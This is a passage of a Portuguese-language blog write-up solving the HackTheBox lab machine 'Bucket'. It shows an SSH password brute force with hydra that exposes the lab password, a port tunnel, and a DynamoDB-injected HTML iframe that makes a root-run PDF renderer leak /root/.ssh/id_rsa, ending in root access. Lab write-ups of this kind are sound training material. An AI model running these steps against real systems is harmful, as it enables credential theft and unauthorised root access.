+tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -                         
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                         
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                     
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Esta máquina possui serviços de container em execução (<code class="language-plaintext highlighter-rouge">ctr</code>, <code class="language-plaintext highlighter-rouge">runc</code>), que executam provavelmente o localstack e que poderiam ser avaliados para escalação de privilégios.</p>
+  </li>
+  <li>
+    <p>Existe um diretório <code class="language-plaintext highlighter-rouge">/var/www/bucket-app</code> que pode ser a aplicação servida em uma das portas identificadas, mas que não possuímos acesso de leitura com a conta utilizada.</p>
+  </li>
+</ul>
+
+<p>Dos pontos mencionados, o que mais chamou atenção foi o possível website em execução nas portas citadas, logo iniciei por verificar as configurações ativas no Apache (<code class="language-plaintext highlighter-rouge">/etc/apache2/sites-enabled</code>) onde tínhamos o arquivo <code class="language-plaintext highlighter-rouge">000-default.conf</code> listado abaixo, mas não encontrei nada sobre a porta 38443, mas tive a informação sobre a porta 4566, que é publicada pela porta 80 e na porta 8000, que é publicado o website disponível na pasta <code class="language-plaintext highlighter-rouge">/var/www/bucket-app</code>.</p>
+
+<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nl">VirtualHost</span><span class="sr"> 127.0.0.1:8000</span><span class="p">&gt;
+</span>    <span class="p">&lt;</span><span class="nl">IfModule</span><span class="sr"> mpm_itk_module</span><span class="p">&gt;
+</span>        AssignUserId root root
+    <span class="p">&lt;/</span><span class="nl">IfModule</span><span class="p">&gt;
+</span>    <span class="nc">DocumentRoot</span> /var/www/bucket-app
+<span class="p">&lt;/</span><span class="nl">VirtualHost</span><span class="p">&gt;
+</span>
+<span class="p">&lt;</span><span class="nl">VirtualHost</span><span class="sr"> *:80</span><span class="p">&gt;
+</span>    <span class="nc">DocumentRoot</span> /var/www/html
+    <span class="nc">RewriteEngine</span> <span class="ss">On</span>
+    <span class="nc">RewriteCond</span> %{HTTP_HOST} !^bucket.htb$
+    <span class="nc">RewriteRule</span> /.* http://bucket.htb/ [R]
+<span class="p">&lt;/</span><span class="nl">VirtualHost</span><span class="p">&gt;
+&lt;</span><span class="nl">VirtualHost</span><span class="sr"> *:80</span><span class="p">&gt;
+</span>    <span class="nc">ProxyPreserveHost</span> <span class="ss">on</span>
+    <span class="nc">ProxyPass</span> / http://localhost:4566/
+    <span class="nc">ProxyPassReverse</span> / http://localhost:4566/
+    <span class="p">&lt;</span><span class="nl">Proxy</span><span class="sr"> *</span><span class="p">&gt;
+</span>        <span class="nc">Order</span> deny,allow
+        <span class="nc">Allow</span> <span class="ss">from</span> <span class="ss">all</span>
+    <span class="p">&lt;/</span><span class="nl">Proxy</span><span class="p">&gt;
+</span>    <span class="nc">ServerAdmin</span> webmaster@localhost
+    <span class="nc">ServerName</span> s3.bucket.htb
+
+    <span class="nc">ErrorLog</span> ${APACHE_LOG_DIR}/error.log
+    <span class="nc">CustomLog</span> ${APACHE_LOG_DIR}/access.log combined
+
+<span class="p">&lt;/</span><span class="nl">VirtualHost</span><span class="p">&gt;
+</span></code></pre></div></div>
+
+<p>Embora possível identificar os serviços ativos apenas a partir da máquina local, precisaremos realizar a exploração apenas via linha de comando ou precisaremos de uma conta na máquina para tunelar o acesso a partir de SSH.</p>
+
+<p>Já que os websites não permitiram muitos detalhes na enumeração, decidi testar as senhas obtidas anteriormente via DynamoDB para o usuário <code class="language-plaintext highlighter-rouge">roy</code> e felizmente tivemos sucesso. Abaixo a execução do <code class="language-plaintext highlighter-rouge">hydra</code> que utilizei para automatizar  brute force na conta via SSH.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>hydra <span class="nt">-l</span> roy <span class="nt">-P</span> passwords 10.10.10.212 <span class="nt">-t</span> 4 ssh
+Hydra v9.1 <span class="o">(</span>c<span class="o">)</span> 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes <span class="o">(</span>this is non-binding, these <span class="k">***</span> ignore laws and ethics anyway<span class="o">)</span><span class="nb">.</span>
+
+Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2021-02-26 12:55:36
+<span class="o">[</span>DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries <span class="o">(</span>l:1/p:3<span class="o">)</span>, ~1 try per task
+<span class="o">[</span>DATA] attacking ssh://10.10.10.212:22/
+<span class="o">[</span>22][ssh] host: 10.10.10.212   login: roy   password: n2vM-&lt;_K_Q:.Aa2
+1 of 1 target successfully completed, 1 valid password found
+Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2021-02-26 12:55:40
+</code></pre></div></div>
+
+<p>Uma vez que tínhamos agora acesso à máquina com as credenciais do usuário <code class="language-plaintext highlighter-rouge">roy</code>, coletei a flag de usuário após me conectar via SSH:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>roy@bucket:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>roy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>roy<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>roy<span class="o">)</span>,1001<span class="o">(</span>sysadm<span class="o">)</span>
+roy@bucket:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+&lt;redacted&gt;
+</code></pre></div></div>
+
+<h2 id="root-flag">Root flag</h2>
+
+<p>Com o acesso ao usuário <code class="language-plaintext highlighter-rouge">roy</code> pude validar o acesso aos diretórios <code class="language-plaintext highlighter-rouge">project</code>, que tem aparentemente uma estrutura de um website, além de conseguir com esta conta acessar o conteúdo da aplicação em <code class="language-plaintext highlighter-rouge">/var/www/bucket-app</code> que possui estrutura bastante similar ao encontrado na pasta <code class="language-plaintext highlighter-rouge">project</code>, o qual fiz uma cópia para análise a partir da máquina atacante.</p>
+
+<p>Analisando o conteúdo de <code class="language-plaintext highlighter-rouge">index.php</code> temos um algo bem interessante: uma função escondida para que sempre que chamada POST na página <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8000</code> com o parâmetro <code class="language-plaintext highlighter-rouge">action=get_alerts</code>, é feita uma consulta numa tabela <code class="language-plaintext highlighter-rouge">alerts</code> no DynamoDB em que os valores com Title <code class="language-plaintext highlighter-rouge">Ransonware</code> são incluídos em um PDF e disponibilizados na pasta <code class="language-plaintext highlighter-rouge">/var/www/bucket-app/files/</code>.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">require</span> <span class="s1">'vendor/autoload.php'</span><span class="p">;</span>
+<span class="kn">use</span> <span class="nc">Aws\DynamoDb\DynamoDbClient</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REQUEST_METHOD"</span><span class="p">]</span><span class="o">===</span><span class="s2">"POST"</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"action"</span><span class="p">]</span><span class="o">===</span><span class="s2">"get_alerts"</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nb">date_default_timezone_set</span><span class="p">(</span><span class="s1">'America/New_York'</span><span class="p">);</span>
+        <span class="nv">$client</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DynamoDbClient</span><span class="p">([</span>
+            <span class="s1">'profile'</span> <span class="o">=&gt;</span> <span class="s1">'default'</span><span class="p">,</span>
+            <span class="s1">'region'</span>  <span class="o">=&gt;</span> <span class="s1">'us-east-1'</span><span class="p">,</span>
+            <span class="s1">'version'</span> <span class="o">=&gt;</span> <span class="s1">'latest'</span><span class="p">,</span>
+            <span class="s1">'endpoint'</span> <span class="o">=&gt;</span> <span class="s1">'http://localhost:4566'</span>
+        <span class="p">]);</span>
+
+        <span class="nv">$iterator</span> <span class="o">=</span> <span class="nv">$client</span><span class="o">-&gt;</span><span class="nf">getIterator</span><span class="p">(</span><span class="s1">'Scan'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
+            <span class="s1">'TableName'</span> <span class="o">=&gt;</span> <span class="s1">'alerts'</span><span class="p">,</span>
+            <span class="s1">'FilterExpression'</span> <span class="o">=&gt;</span> <span class="s2">"title = :title"</span><span class="p">,</span>
+            <span class="s1">'ExpressionAttributeValues'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">":title"</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="s2">"S"</span><span class="o">=&gt;</span><span class="s2">"Ransomware"</span><span class="p">)),</span>
+        <span class="p">));</span>
+
+        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$iterator</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$name</span><span class="o">=</span><span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span><span class="mf">.</span><span class="s1">'.html'</span><span class="p">;</span>
+            <span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'files/'</span><span class="mf">.</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$item</span><span class="p">[</span><span class="s2">"data"</span><span class="p">]);</span>
+        <span class="p">}</span>
+        <span class="nb">passthru</span><span class="p">(</span><span class="s2">"java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span><span class="nv">$name</span><span class="s2"> 800 A4 -out files/result.pdf"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">else</span>
+<span class="p">{</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Uma vez que não temos uma tabela chamada <code class="language-plaintext highlighter-rouge">alerts</code>, conforme já enumerado, precisaremos criá-la com os atributos <code class="language-plaintext highlighter-rouge">title</code> e <code class="language-plaintext highlighter-rouge">data</code>, este, por sua vez, com conteúdo HTML a ser renderizado e posteriormente salvo no formato PDF, permitindo a possível obtenção de dados sensíveis da máquina.</p>
+
+<p>Para os testes iniciais, conforme documentação da AWS disponível <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-services-dynamodb.html">neste link</a>, criei um script para criação da tabela, inclusão de uma entrada e posterior chamada POST na URL em questão para gerar o arquivo PDF.</p>
+
+<p>Para simplificar este processo, que está sendo feito da máquina atacante, realizados os seguintes procedimentos:</p>
+
+<ul>
+  <li>Na máquina atacante, criado chave RSA (<code class="language-plaintext highlighter-rouge">ssh-keygen</code>) e atribuido chave pública dela ao usuário <code class="language-plaintext highlighter-rouge">roy</code> na máquina bucket para que não fosse necessário o uso de senhas durante a autenticação.</li>
+  <li>Na máquina atacante também foi criado o tunelamento da porta local 8000/TCP, a qual foi redirecionada para a porta 8000 na máquina bucket, fazendo o serviço disponível também localmente, o que posteriormente foi possível validar acessando localmente a página conforme evidencia abaixo</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh roy@10.10.10.212 <span class="nt">-L</span> 8000:127.0.0.1:8000 
+</code></pre></div></div>
+
+<p><img src="https://i.imgur.com/tiTjm7I.png" alt="Website 8000/TCP via SSH Tunnel"></p>
+
+<p>Após algumas tentativas, notei que similar ao desafio encontrado durante o upload do shell reverso, os itens criados no DynamoDB também são removidos após algum tempo, logo foi necessário encadear todas as requisições para que tivéssemos tempo para executar a ação imediatamente assim que os recursos estivessem disponíveis, assim como a posterior cópia dos ativos se obtivermos sucesso na chamada.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws dynamodb create-table <span class="se">\</span>
+    <span class="nt">--table-name</span> alerts <span class="se">\</span>
+    <span class="nt">--attribute-definitions</span> <span class="nv">AttributeName</span><span class="o">=</span>title,AttributeType<span class="o">=</span>S <span class="nv">AttributeName</span><span class="o">=</span>data,AttributeType<span class="o">=</span>S <span class="se">\</span>
+    <span class="nt">--key-schema</span> <span class="nv">AttributeName</span><span class="o">=</span>title,KeyType<span class="o">=</span>HASH <span class="nv">AttributeName</span><span class="o">=</span>data,KeyType<span class="o">=</span>RANGE <span class="se">\</span>
+    <span class="nt">--provisioned-throughput</span> <span class="nv">ReadCapacityUnits</span><span class="o">=</span>10,WriteCapacityUnits<span class="o">=</span>10 <span class="se">\</span>
+    <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="se">\</span>
+    <span class="nt">--profile</span> bucket.htb <span class="o">&amp;&amp;</span> <span class="se">\</span>
+aws dynamodb put-item <span class="se">\</span>
+    <span class="nt">--table-name</span> alerts <span class="se">\</span>
+    <span class="nt">--item</span> <span class="s1">'{"title": {"S": "Ransomware"},"data": {"S": "&lt;html&gt;&lt;head&gt;&lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Head 1&lt;/h1&gt;&lt;p&gt;Content&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;"}}'</span> <span class="se">\</span>
+    <span class="nt">--return-consumed-capacity</span> TOTAL <span class="se">\</span>
+    <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="se">\</span>
+    <span class="nt">--profile</span> bucket.htb <span class="o">&amp;&amp;</span> <span class="se">\</span>
+curl <span class="nt">--data</span> <span class="s2">"action=get_alerts"</span> http://localhost:8000/
+</code></pre></div></div>
+
+<p>Após algumas tentativas, seguido do desafio do tempo para cópia do arquivo para a máquina atacante, foi possível gerar e copiar o arquivo PDF com base no HTML enviado.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>roy@bucket:/var/www/bucket-app/files<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 16
+drwxr-x---+ 2 root root 4096 Feb 26 18:51 <span class="nb">.</span>
+drwxr-x---+ 4 root root 4096 Feb 10 12:29 ..
+<span class="nt">-rw-r--r--</span>  1 root root   88 Feb 26 18:51 7627.html
+<span class="nt">-rw-r--r--</span>  1 root root 1870 Feb 26 18:51 result.pdf
+</code></pre></div></div>
+
+<p><img src="https://i.imgur.com/XLxhZ9W.png" alt="Bucket HTB - PoC" class="align-center"></p>
+
+<p>Uma vez que conseguimos renderizar o conteúdo desejado, precisamos encontrar uma forma de incluir arquivos na página renderizada e que resulta no PDF, de modo a dar continuidade na exploração.</p>
+
+<p>A forma mais fácil de obter o root flag seria importar o arquivo <code class="language-plaintext highlighter-rouge">/root/root.txt</code>, porém isso não nos dá um shell reverso de fato. Seguindo o exemplo da máquina <a href="/writeup/2021/03/htb-passage/"><strong>Passage</strong></a>, podemos buscar por um arquivo <code class="language-plaintext highlighter-rouge">/root/.ssh/id_rsa</code> e nos conectar à máquina via shell interativo, porém nosso maior problema no momento é inserir o conteúdo destes em um arquivo HTML.</p>
+
+<p>Após algumas pesquisas, a forma mais simples de alcançar este objetivo sem o uso de Javascript é utilizando um <strong>iframe</strong>, onde as alterações, para a qual incluí a tag <code class="language-plaintext highlighter-rouge">&lt;iframe src="/root/.ssh/id_rsa" seamless&gt;&lt;/iframe&gt;</code> no HTML utilizado anteriormente, conforme chamadas abaixo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aws dynamodb create-table <span class="se">\</span>
+    <span class="nt">--table-name</span> alerts <span class="se">\</span>
+    <span class="nt">--attribute-definitions</span> <span class="nv">AttributeName</span><span class="o">=</span>title,AttributeType<span class="o">=</span>S <span class="nv">AttributeName</span><span class="o">=</span>data,AttributeType<span class="o">=</span>S <span class="se">\</span>
+    <span class="nt">--key-schema</span> <span class="nv">AttributeName</span><span class="o">=</span>title,KeyType<span class="o">=</span>HASH <span class="nv">AttributeName</span><span class="o">=</span>data,KeyType<span class="o">=</span>RANGE <span class="se">\</span>
+    <span class="nt">--provisioned-throughput</span> <span class="nv">ReadCapacityUnits</span><span class="o">=</span>10,WriteCapacityUnits<span class="o">=</span>10 <span class="se">\</span>
+    <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="se">\</span>
+    <span class="nt">--profile</span> bucket.htb <span class="o">&amp;&amp;</span> <span class="se">\</span>
+aws dynamodb put-item <span class="se">\</span>
+    <span class="nt">--table-name</span> alerts <span class="se">\</span>
+    <span class="nt">--item</span> <span class="s1">'{"title": {"S": "Ransomware"},"data": {"S": "&lt;html&gt;&lt;head&gt;&lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Head 1&lt;/h1&gt;&lt;iframe src=\"/root/.ssh/id_rsa\" seamless&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;"}}'</span> <span class="se">\</span>
+    <span class="nt">--return-consumed-capacity</span> TOTAL <span class="se">\</span>
+    <span class="nt">--endpoint-url</span> http://s3.bucket.htb <span class="se">\</span>
+    <span class="nt">--profile</span> bucket.htb <span class="o">&amp;&amp;</span> <span class="se">\</span>
+curl <span class="nt">--data</span> <span class="s2">"action=get_alerts"</span> http://localhost:8000/    
+</code></pre></div></div>
+
+<p>Após o procedimento foi possível baixar o aquivo <code class="language-plaintext highlighter-rouge">/var/www/bucket-app/files/result.pdf</code> e, com o conteúdo presente neste arquivo, criar o arquivo <code class="language-plaintext highlighter-rouge">id_rsa</code>, o qual foi posteriormente utilizado para conectar-se à máquina via SSH e obter a shell a partir do usuário <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@bucket:~# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+root@bucket:~# <span class="nb">cat</span> /root/root.txt
+&lt;redacted&gt;
+</code></pre></div></div>
+
+<p>Espero que tenham gostado!</p>
+
+<p>Vejo vocês novamente em breve no próximo post! <img class="emoji" title=":smiley:" alt=":smiley:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png" height="20" width="20"></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#hackthebox" class="page__taxonomy-item" rel="tag">HackTheBox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#htb-linux" class="page__taxonomy-item" rel="tag">htb-linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#htb-medium" class="page__taxonomy-item" rel="tag">htb-medium</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categorias: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categorias/#writeup" class="page__taxonomy-item" rel="tag">Writeup</a>
+    
+    </span>
+  </p>
+
+
+        
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Atualizado em:</strong> <time datetime="2021-04-24T09:00:00-03:00">April 24, 2021</time></p>
+
+
+      </footer>
+
+      <section id="sharelinks" class="page__share">
+  
+    <h4 class="page__share-title">Compartilhe</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?via=zerahzurc&amp;text=Hackthebox+write-up%3A+Bucket%20https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F04%2Fhtb-bucket%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F04%2Fhtb-bucket%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F04%2Fhtb-bucket%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+
+  <a href="whatsapp://send?text=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F04%2Fhtb-bucket%2F" data-action="share/whatsapp/share" class="btn btn--whatsapp" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Whatsapp"><i class="fab fa-fw fa-whatsapp" aria-hidden="true"></i><span> Whatsapp</span></a>
+
+  <a href="https://telegram.me/share/url?url=https%3A%2F%2Fdavicruz.com%2Fwriteup%2F2021%2F04%2Fhtb-bucket%2F&amp;text=Hackthebox+write-up%3A+Bucket" class="btn btn--telegram" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Compartilhe Telegram"><i class="fab fa-fw fa-telegram-plane" aria-hidden="true"></i><span> Telegram</span></a>
+
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+    
+      <a href="/writeup/2021/04/htb-laboratory/" class="pagination--pager" title="Hackthebox write-up: Laboratory
+">Anterior</a>
+    
+    
+    
+      
+        <a href="/writeup/2021/05/htb-ready/" class="pagination--pager" title="Hackthebox write-up: Ready
+">Próxima</a>
+        
+    
+  </nav>
+
+    </div>
+
+    
+      <div class="page__comments">
+  
+  
+      <h4 class="page__comments-title">Deixe um comentário</h4>
+      <section id="utterances-comments"></section>
+    
+</div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">Talvez você também goste</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/BmkB4rb.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+
+      
+      <a href="https://davicruz.com/writeup/2021/06/htb-tenet/" rel="permalink">Hackthebox write-up: Tenet
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-06-12T13:00:00-03:00">June 12, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          7 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/04/htb-bucket/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será Tenet, outra máquina Linux classificada como mediana do Hack The Box, criada por egotisticalSW.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/wHnMfBz.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+
+      
+      <a href="https://davicruz.com/writeup/2021/06/htb-scriptkiddie/" rel="permalink">Hackthebox write-up: ScriptKiddie
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-06-05T13:00:00-03:00">June 5, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          4 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/04/htb-bucket/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será ScriptKiddie, outra máquina Linux classificada como fácil do Hack The Box, criada por 0xdf.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/FTjLM76.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+
+      
+      <a href="https://davicruz.com/writeup/2021/05/htb-delivery/" rel="permalink">Hackthebox write-up: Delivery
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-05-22T13:00:00-03:00">May 22, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          8 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/04/htb-bucket/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será Delivery, outra máquina Linux classificada como fácil do Hack The Box, criada por ippsec.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/R2EVM1J.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+
+      
+      <a href="https://davicruz.com/writeup/2021/05/htb-ready/" rel="permalink">Hackthebox write-up: Ready
+</a>
+      
+      
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-05-15T13:00:00-03:00">May 15, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          6 minuto(s) de leitura
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        
+        
+        <span class="page__meta-lang"><a href="/en-US/writeup/2021/04/htb-bucket/">Read also in  <img class="emoji" title=":us:" alt=":us:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1fa-1f1f8.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Compartilhar</a>
+      </span>
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Olá pessoal!
+
+A máquina desta semana será Ready, outra máquina Linux classificada como mediana do Hack The Box, criada por bertolis.
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap">
+<form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
